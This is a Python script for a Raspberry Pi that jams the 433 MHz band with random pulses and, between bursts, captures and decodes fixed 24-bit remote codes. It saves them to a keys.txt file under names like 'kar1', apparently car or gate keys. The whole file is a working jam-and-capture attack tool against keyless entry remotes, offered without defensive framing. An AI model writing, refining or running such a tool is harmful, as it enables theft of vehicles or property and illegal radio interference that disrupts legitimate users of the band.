import pigpio
import time
import random
import signal
import sys
import os
import subprocess
from statistics import mean, stdev

# Configuration
GPIO_TX_PIN = 20   # GPIO for RF transmitter (jamming)
GPIO_RX_PIN = 21   # GPIO for RF receiver (capturing)
JAM_DURATION = 0.05   # Duration of jamming phase (seconds)
CAPTURE_DURATION = 0.05  # Duration of capture phase (seconds)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MIN_PULSES = 10
MAX_STD_DEV = 1200
MIN_BITS_LEN = 23
MAX_BITS_LEN = 25
REPEAT_SUPPRESSION_MS = 100

# Initialize pigpio
try:
    subprocess.run(["pgrep", "pigpiod"], check=True, capture_output=True)
    print("✅ pigpiod is running")
except subprocess.CalledProcessError:
    try:
        subprocess.run(["sudo", "pigpiod"], check=True)
        print("🔄 Started pigpiod daemon")
    except Exception as e:
        print(f"❌ Error starting pigpiod: {e}")
        sys.exit(1)

pi = pigpio.pi()
if not pi.connected:
    print("❌ Error: Failed to connect to pigpiod. Run 'sudo pigpiod' first!")
    sys.exit(1)

# Setup GPIO
pi.set_mode(GPIO_TX_PIN, pigpio.OUTPUT)
pi.set_mode(GPIO_RX_PIN, pigpio.INPUT)
pi.set_pull_up_down(GPIO_RX_PIN, pigpio.PUD_DOWN)
print(f"🔧 Initialized GPIO {GPIO_TX_PIN} for jamming, {GPIO_RX_PIN} for capturing")

# State
running = True
timings = []
last_tick = None
last_bits = ""
last_bits_time = 0
wave_ids = []

# Save key to keys.txt
def save_key(key):
    count = get_saved_keys_count() + 1
    kar_name = f"kar{count}"
    with open(os.path.join(BASE_DIR, "keys.txt"), "a") as f:
        f.write(f"{kar_name}:{key}\n")
    return kar_name

def get_saved_keys_count():
    try:
        with open(os.path.join(BASE_DIR, "keys.txt"), "r") as f:
            return len(f.readlines())
    except FileNotFoundError:
        return 0

# Signal processing for capture
def decode_bits(bits):
    try:
        decimal_value = int(bits, 2)
        hex_value = hex(decimal_value)
        return decimal_value, hex_value
    except ValueError:
        return None, None

def get_stddev(data):
    if len(data) < 2:
        return 0
    return stdev(data)

def filter_outliers(data, std_multiplier=2):
    if len(data) < 2:
        return data
    mean_val = mean(data)
    stddev = get_stddev(data)
    return [x for x in data if (mean_val - std_multiplier * stddev) <= x <= (mean_val + std_multiplier * stddev)]

def timings_to_bits(timings):
    bits = ""
    filtered_timings = filter_outliers(timings)

    highs = filtered_timings[::2]
    lows = filtered_timings[1::2]

    if len(highs) < 2 or len(lows) < 2:
        return None

    avg_high = mean(highs)
    avg_low = mean(lows)

    for i in range(0, len(filtered_timings) - 1, 2):
        high = filtered_timings[i]
        low = filtered_timings[i + 1]
        if high < avg_high and low > avg_low:
            bits += "0"
        elif high > avg_high and low < avg_low:
            bits += "1"
        else:
            continue

    if MIN_BITS_LEN <= len(bits) <= MAX_BITS_LEN:
        return bits
    return None

def process_timings(timings):
    global last_bits, last_bits_time
    bits = timings_to_bits(timings)
    if bits:
        now_time = time.time()
        if bits != last_bits or (now_time - last_bits_time) * 1000 > REPEAT_SUPPRESSION_MS:
            dec_val, hex_val = decode_bits(bits)
            if dec_val is not None:
                now = time.strftime("%H:%M:%S", time.localtime())
                output = f"{dec_val}"
                print(f"📡 Received code: {output}")
                key_name = save_key(output)
                print(f"✅ Key saved as {key_name}: {output}")
                sys.stdout.flush()
                last_bits = bits
                last_bits_time = now_time

def rf_callback(gpio, level, tick):
    global last_tick, timings

    if level == pigpio.TIMEOUT:
        if len(timings) >= MIN_PULSES and get_stddev(timings) < MAX_STD_DEV:
            process_timings(timings)
        timings = []
        return

    if last_tick is not None:
        duration = pigpio.tickDiff(last_tick, tick)
        if 100 < duration < 5000:
            timings.append(duration)

    last_tick = tick

# Jamming functions
def smooth_shutdown(signal, frame):
    global running
    running = False
    print("🛑 Initiating smooth shutdown...")

def rf_jamming_capture():
    global running, wave_ids
    try:
        print("🚨 Starting RF jamming + capturing on 433 MHz...")
        pi.callback(GPIO_RX_PIN, pigpio.EITHER_EDGE, rf_callback)
        pi.set_watchdog(GPIO_RX_PIN, 10)

        while running:
            # Jamming phase
            pulse_duration = random.randint(50, 500)
            pi.wave_clear()

            pulses = [
                pigpio.pulse(1 << GPIO_TX_PIN, 0, pulse_duration),
                pigpio.pulse(0, 1 << GPIO_TX_PIN, pulse_duration)
            ]

            pi.wave_add_generic(pulses)
            wave_id = pi.wave_create()

            if wave_id >= 0:
                wave_ids.append(wave_id)
                pi.wave_send_repeat(wave_id)
                time.sleep(JAM_DURATION)
                pi.wave_tx_stop()
                pi.wave_delete(wave_id)

            # Capture phase
            pi.wave_tx_stop()  # Ensure transmitter is off
            time.sleep(CAPTURE_DURATION)  # Allow receiver to listen

        # Smooth fade-out for jamming
        print("🌙 Starting fade-out sequence...")
        for i in range(5, 0, -1):
            pulse_duration = i * 200
            pi.wave_clear()

            pulses = [
                pigpio.pulse(1 << GPIO_TX_PIN, 0, pulse_duration),
                pigpio.pulse(0, 1 << GPIO_TX_PIN, pulse_duration)
            ]

            pi.wave_add_generic(pulses)
            wave_id = pi.wave_create()

            if wave_id >= 0:
                pi.wave_send_repeat(wave_id)
                time.sleep(0.5)
                pi.wave_tx_stop()
                pi.wave_delete(wave_id)
            print(f"🔅 Fade-out step {6 - i}/5, pulse: {pulse_duration}µs")

        # Final cleanup
        pi.wave_tx_stop()
        pi.wave_clear()
        pi.write(GPIO_TX_PIN, 0)
        pi.write(GPIO_RX_PIN, 0)
        pi.set_watchdog(GPIO_RX_PIN, 0)
        pi.stop()
        print("✅ RF jamming and capturing stopped smoothly. Receiver is safe now.")

    except Exception as e:
        print(f"⚠️ Error during operation: {e}")
        pi.wave_tx_stop()
        pi.wave_clear()
        pi.write(GPIO_TX_PIN, 0)
        pi.write(GPIO_RX_PIN, 0)
        pi.set_watchdog(GPIO_RX_PIN, 0)
        pi.stop()
        print("🧹 Emergency cleanup completed.")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, smooth_shutdown)
    rf_jamming_capture()